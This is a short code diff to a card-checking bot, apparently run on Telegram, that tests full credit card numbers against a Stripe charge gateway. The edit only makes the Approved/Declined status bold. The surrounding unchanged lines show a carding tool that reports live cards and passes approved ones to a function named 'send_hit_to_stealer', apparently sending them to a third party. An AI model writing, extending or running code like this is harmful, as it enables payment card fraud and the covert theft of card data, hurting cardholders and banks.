@@ -133,7 +133,10 @@ async def stripe_charge_cmd(Client, message):
         if "Approved" in status:
             await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)
 
-        finalresp = f"""{status}
+        # Make both Approved and Declined bold
+        display_status = f"<b>{status}</b>"
+
+        finalresp = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
@@ -335,7 +338,10 @@ Checked by: {first_name} ({role})""",
     await progress_msg.delete()
 
     for card in approved_cards:
-        approved_msg = f"""{card['status']}
+        # Make status bold (both Approved and Declined)
+        display_status = f"<b>{card['status']}</b>"
+
+        approved_msg = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
